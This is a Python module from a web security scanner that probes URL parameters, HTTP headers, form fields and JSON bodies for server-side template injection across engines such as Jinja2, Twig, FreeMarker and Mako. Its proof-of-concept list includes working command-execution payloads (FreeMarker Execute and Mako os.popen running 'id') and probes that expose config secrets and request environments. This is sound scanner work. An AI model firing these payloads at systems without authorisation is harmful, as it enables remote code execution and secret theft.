"""
websecure.scanners.ssti
------------------------
Server-Side Template Injection (SSTI) scanner.
Three-tier approach: polyglot probe → engine fingerprinting → PoC evidence.
Attack surfaces: URL params, POST form data, JSON body, HTTP headers, cookies.
"""
from __future__ import annotations

import logging
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse

import requests as _requests

from websecure.scanners.base import BaseScanner

_logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Tier 1: Polyglot probes — trigger math evaluation across multiple engines
# ---------------------------------------------------------------------------
_TIER1_PROBES: List[Tuple[str, str]] = [
    ("{{7*7}}", r"49"),
    ("${7*7}", r"49"),
    ("#{7*7}", r"49"),
    ("<%= 7*7 %>", r"49"),
    ("*{7*7}", r"49"),
    ("{7*7}", r"49"),
    ("{{7*'7'}}", r"7777777|49"),   # Jinja2 vs Twig disambiguation
    ("${{7*7}}", r"49"),
]

# ---------------------------------------------------------------------------
# Tier 2: Engine fingerprinting probes
# ---------------------------------------------------------------------------
_TIER2_ENGINE_PROBES: Dict[str, List[Tuple[str, str]]] = {
    "Jinja2": [
        ("{{config}}", r"<Config|SECRET_KEY|DEBUG"),
        ("{{self.__class__}}", r"TemplateReference"),
        ("{{lipsum}}", r"\w+\s+\w+"),
    ],
    "Twig": [
        ("{{_self}}", r"Twig_Template"),
        ("{{_self.env}}", r"Twig_Environment"),
        ("{{dump()}}", r"NULL|bool|string"),
    ],
    "FreeMarker": [
        ("${.data_model}", r"freemarker|BeansWrapper"),
        ("${.template_name}", r"\.ftl|template"),
    ],
    "Velocity": [
        ("#set($x=7*7)${x}", r"49"),
        ("#foreach($i in [1..3])${i}#end", r"123"),
    ],
    "Smarty": [
        ("{$smarty.version}", r"\d+\.\d+"),
        ("{php}echo 7*7;{/php}", r"49"),
    ],
    "Pebble": [
        ("{{1+1}}", r"2"),
    ],
    "Mako": [
        ("${7*7}", r"49"),
        ("<% x = 7*7 %>\n${x}", r"49"),
    ],
}

# ---------------------------------------------------------------------------
# Tier 3: PoC probes (evidence gathering only, no auto-exploit)
# ---------------------------------------------------------------------------
_TIER3_POC: Dict[str, List[str]] = {
    "Jinja2": [
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.environ}}",
    ],
    "Twig": [
        "{{_self.env.getExtension('Twig_Extension_Debug')}}",
    ],
    "FreeMarker": [
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    ],
    "Mako": [
        "${self.module.cache.util.os.popen('id').read()}",
    ],
}


class SSTIScanner(BaseScanner):
    """
    SSTI scanner with 3-tier detection: polyglot → fingerprint → PoC.
    Does NOT auto-exploit. Reports Critical severity on confirmation.
    """

    name = "ssti"
    phase = "offensive"

    def __init__(self, session=None, results: Dict = None, debug: bool = False,
                 timeout: int = 10):
        super().__init__(session, results, debug)
        self.timeout = timeout

    # Headers to inject SSTI payloads into (common server-side reflection points)
    _INJECTION_HEADERS = [
        "User-Agent",
        "X-Forwarded-For",
        "Referer",
        "X-Custom-Header",
        "X-Api-Version",
        "Accept-Language",
        "X-Original-URL",
    ]

    def run(self, target: str, **kwargs):
        endpoints = kwargs.get("endpoints") or [target]
        forms = kwargs.get("forms") or []

        for url in endpoints:
            self._scan_url(url)
            self._scan_headers(url)

        for form in forms:
            action = form.get("action") or target
            method = (form.get("method") or "GET").upper()
            inputs = form.get("inputs") or []
            self._scan_form(action, method, inputs)

    def _scan_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return

        for param_name, _ in params:
            tier1_hit = self._tier1_probe(url, parsed, params, param_name)
            if not tier1_hit:
                continue

            payload, evidence = tier1_hit
            _logger.info(f"[SSTI] Tier1 hit: {url} param={param_name}")

            engine = self._tier2_fingerprint(url, parsed, params, param_name)

            poc_evidence = None
            if engine:
                poc_evidence = self._tier3_poc(url, parsed, params, param_name, engine)

            self._emit_finding(url, param_name, payload, evidence, engine, poc_evidence)

    def _tier1_probe(self, url: str, parsed, params: List, param_name: str
                     ) -> Optional[Tuple[str, str]]:
        for payload, expected_re in _TIER1_PROBES:
            new_params = dict(params)
            new_params[param_name] = payload
            test_url = self._build_url(parsed, new_params)
            body = self._get(test_url)
            if body and re.search(expected_re, body):
                return payload, body[:200]
        return None

    def _tier2_fingerprint(self, url: str, parsed, params: List, param_name: str
                           ) -> Optional[str]:
        for engine, probes in _TIER2_ENGINE_PROBES.items():
            for payload, expected_re in probes:
                new_params = dict(params)
                new_params[param_name] = payload
                test_url = self._build_url(parsed, new_params)
                body = self._get(test_url)
                if body and re.search(expected_re, body, re.I):
                    _logger.info(f"[SSTI] Engine fingerprinted: {engine}")
                    return engine
        return None

    def _tier3_poc(self, url: str, parsed, params: List, param_name: str,
                   engine: str) -> Optional[str]:
        for payload in _TIER3_POC.get(engine, []):
            new_params = dict(params)
            new_params[param_name] = payload
            test_url = self._build_url(parsed, new_params)
            body = self._get(test_url)
            if body and len(body.strip()) > 10:
                if re.search(r'object|class|module|environ|subprocess|os\.', body, re.I):
                    return body[:300]
        return None

    # ------------------------------------------------------------------
    # Surface: HTTP Headers
    # ------------------------------------------------------------------

    def _scan_headers(self, url: str):
        """Test common HTTP headers for SSTI reflection."""
        for header_name in self._INJECTION_HEADERS:
            tier1_hit = self._tier1_probe_header(url, header_name)
            if not tier1_hit:
                continue
            payload, evidence = tier1_hit
            _logger.info(f"[SSTI] Header hit: {url} header={header_name}")
            self._emit_finding(url, f"header:{header_name}", payload, evidence, None, None)

    def _tier1_probe_header(self, url: str, header_name: str) -> Optional[Tuple[str, str]]:
        for payload, expected_re in _TIER1_PROBES:
            body = self._request_with_header(url, header_name, payload)
            if body and re.search(expected_re, body):
                return payload, body[:200]
        return None

    def _request_with_header(self, url: str, header_name: str, payload: str) -> Optional[str]:
        try:
            headers = {header_name: payload}
            resp = self.session.get(url, headers=headers, timeout=self.timeout)
            return resp.text
        except _requests.exceptions.Timeout as exc:
            _logger.debug(f"[SSTI] Header probe timed out for {url} [{header_name}]: {exc!r}")
            return None
        except _requests.exceptions.ConnectionError as exc:
            _logger.debug(f"[SSTI] Header probe connection error for {url}: {exc!r}")
            return None
        except _requests.exceptions.RequestException as exc:
            _logger.warning(f"[SSTI] Header probe failed for {url}: {exc!r}")
            return None

    # ------------------------------------------------------------------
    # Surface: POST form data and JSON body
    # ------------------------------------------------------------------

    def _scan_form(self, action: str, method: str, inputs: List[Dict]):
        """Test each form field for SSTI via POST/GET submission."""
        skipped_types = {"submit", "button", "image", "reset", "file"}
        fuzzable = [i for i in inputs if i.get("type", "text") not in skipped_types]
        base_data = {i["name"]: i.get("value", "") for i in inputs if i.get("name")}

        for inp in fuzzable:
            p_name = inp.get("name")
            if not p_name:
                continue
            for payload, expected_re in _TIER1_PROBES:
                form_data = dict(base_data)
                form_data[p_name] = payload
                body = self._submit_form(action, method, form_data)
                if body and re.search(expected_re, body):
                    _logger.info(f"[SSTI] Form hit: {action} field={p_name}")
                    self._emit_finding(action, p_name, payload, body[:200], None, None)
                    break  # one confirmed vuln per field

        if method == "POST":
            self._scan_json_body(action, fuzzable, base_data)

    def _scan_json_body(self, url: str, fields: List[Dict], base_data: Dict):
        """Test POST JSON body parameters for SSTI."""
        for inp in fields:
            p_name = inp.get("name")
            if not p_name:
                continue
            for payload, expected_re in _TIER1_PROBES:
                json_data = dict(base_data)
                json_data[p_name] = payload
                body = self._post_json(url, json_data)
                if body and re.search(expected_re, body):
                    _logger.info(f"[SSTI] JSON body hit: {url} field={p_name}")
                    self._emit_finding(url, f"json:{p_name}", payload, body[:200], None, None)
                    break

    def _submit_form(self, action: str, method: str, data: Dict) -> Optional[str]:
        try:
            if method == "POST":
                resp = self.session.post(action, data=data, timeout=self.timeout)
            else:
                resp = self.session.get(action, params=data, timeout=self.timeout)
            return resp.text
        except _requests.exceptions.Timeout as exc:
            _logger.debug(f"[SSTI] Form submit timed out for {action}: {exc!r}")
            return None
        except _requests.exceptions.ConnectionError as exc:
            _logger.debug(f"[SSTI] Form submit connection error for {action}: {exc!r}")
            return None
        except _requests.exceptions.RequestException as exc:
            _logger.warning(f"[SSTI] Form submit failed for {action}: {exc!r}")
            return None

    def _post_json(self, url: str, data: Dict) -> Optional[str]:
        try:
            headers = {"Content-Type": "application/json"}
            resp = self.session.post(url, json=data, headers=headers, timeout=self.timeout)
            return resp.text
        except _requests.exceptions.Timeout as exc:
            _logger.debug(f"[SSTI] JSON POST timed out for {url}: {exc!r}")
            return None
        except _requests.exceptions.ConnectionError as exc:
            _logger.debug(f"[SSTI] JSON POST connection error for {url}: {exc!r}")
            return None
        except _requests.exceptions.RequestException as exc:
            _logger.warning(f"[SSTI] JSON POST failed for {url}: {exc!r}")
            return None

    def _get(self, url: str) -> Optional[str]:
        try:
            resp = self.session.get(url, timeout=self.timeout)
            return resp.text
        except _requests.exceptions.Timeout as exc:
            _logger.debug(f"[SSTI] GET timed out for {url}: {exc!r}")
            return None
        except _requests.exceptions.ConnectionError as exc:
            _logger.debug(f"[SSTI] GET connection error for {url}: {exc!r}")
            return None
        except _requests.exceptions.RequestException as exc:
            _logger.warning(f"[SSTI] GET failed for {url}: {exc!r}")
            return None

    def _build_url(self, parsed, params: Dict) -> str:
        return urlunparse(parsed._replace(query=urlencode(params)))

    def _emit_finding(self, url: str, param: str, payload: str, evidence: str,
                      engine: Optional[str], poc: Optional[str]):
        """Emit SSTI finding via BaseScanner.report_finding() (single reporting path)."""
        extra: Dict = {
            "engine": engine or "unknown",
            "verified": True,
            "confidence": "high",
        }
        if poc:
            extra["poc_evidence"] = poc[:300]
        self.report_finding(
            vuln_type="SSTI",
            url=url,
            param=param,
            payload=payload,
            severity="Critical",
            evidence=evidence,
            extra=extra,
        )


def run(target: str, session=None, results=None, debug=False, **kwargs):
    scanner = SSTIScanner(session=session, results=results, debug=debug)
    scanner.run(target, **kwargs)
